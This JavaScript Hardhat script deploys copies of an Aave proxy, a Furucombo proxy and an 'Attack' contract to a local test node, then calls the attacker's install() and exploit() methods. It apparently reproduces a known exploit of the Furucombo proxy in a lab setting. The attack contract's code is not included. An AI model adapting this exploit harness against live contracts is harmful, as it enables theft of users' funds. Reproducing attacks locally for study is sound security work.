
const hre = require("hardhat");

async function main() {
  // await hre.run('compile');
  
  const myDummyAccount = "0x8626f6940e2eb28930efb4cef49b2d1f2c9c1199";

  const web3 = new Web3("http://127.0.0.1:8545/");
  // const furucomboProxy = new web3.eth.Contract(furucomboProxyABI, furucomboProxyAddress);


///////////////
  const jsonAAVE = require('../artifacts/contracts/AaveV2.sol/InitializableImmutableAdminUpgradeabilityProxy.json');
  const AAVE_ABI = jsonAAVE.abi;

  let aave = new web3.eth.Contract(AAVE_ABI);
  aave.options.data = jsonAAVE.bytecode;


  await aave.deploy({ arguments: [myDummyAccount] })
  .send({
      from: myDummyAccount,
      gas: 15000000,
      gasPrice: '30000000000000'
  }, function(error, transactionHash){ console.log(error, transactionHash); })
  .on('error', function(error){ console.log(error); })
  .then(function(newContractInstance){
      console.log("AAVE address: ", newContractInstance.options.address)
      aave.options.address = newContractInstance.options.address;
  });
/////////////

///////////////
  const jsonFC = require('../artifacts/contracts/FurucomboProxy.sol/Proxy.json');
  const FC_ABI = jsonFC.abi;

  let fc = new web3.eth.Contract(FC_ABI);
  fc.options.data = jsonFC.bytecode;


  await fc.deploy({ arguments: ["0xd4258b13c9fadb7623ca4b15dda34b7b85b842c7"] })
  .send({
      from: myDummyAccount,
      gas: 15000000,
      gasPrice: '30000000000000'
  }, function(error, transactionHash){ console.log(error, transactionHash); })
  .on('error', function(error){ console.log(error); })
  .then(function(newContractInstance){
      console.log("FC address: ", newContractInstance.options.address)
      fc.options.address = newContractInstance.options.address;
  });
/////////////

  const jsonAttackFile = require('../artifacts/contracts/Attacker.sol/Attack.json');
  const jsonAttackABI = jsonAttackFile.abi;

  var myContract = new web3.eth.Contract(jsonAttackABI);
  myContract.options.data = jsonAttackFile.bytecode;

  console.log("here");
  ////////////////////////

  await myContract.deploy({ arguments: [fc.options.address, aave.options.address] })
  .send({
      from: myDummyAccount,
      gas: 1500000,
      gasPrice: '30000000000000'
  }, function(error, transactionHash){ console.log(error, transactionHash); })
  .on('error', function(error){ console.log(error); })
  .then(function(newContractInstance){
      console.log("ATK address: ", newContractInstance.options.address)
      myContract.options.address = newContractInstance.options.address;
  });
  ////////////////////////
  
  // using the callback
  await myContract.methods.install().send({from: myDummyAccount, gas: 15000000,
      gasPrice: '30000000000000'},
    function(error, transactionHash){
      console.log(error, transactionHash);
  })
  .then(function(){
      console.log('install() done')
  });

  let imp = await fc.methods._implementation().send({from: myDummyAccount, gas: 15000000,
      gasPrice: '30000000000000'},
    function(error, transactionHash){
      console.log(error, transactionHash);
  });

  await myContract.methods.exploit().send({from: myDummyAccount, gas: 15000000,
      gasPrice: '30000000000000'},
    function(error, transactionHash){
      console.log(error, transactionHash);
  });

  await myContract.methods._implementation().send({from: myDummyAccount, gas: 15000000,
      gasPrice: '30000000000000'},
    function(error, transactionHash){
      console.log(error, transactionHash);
  });

  console.log("here1");

}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
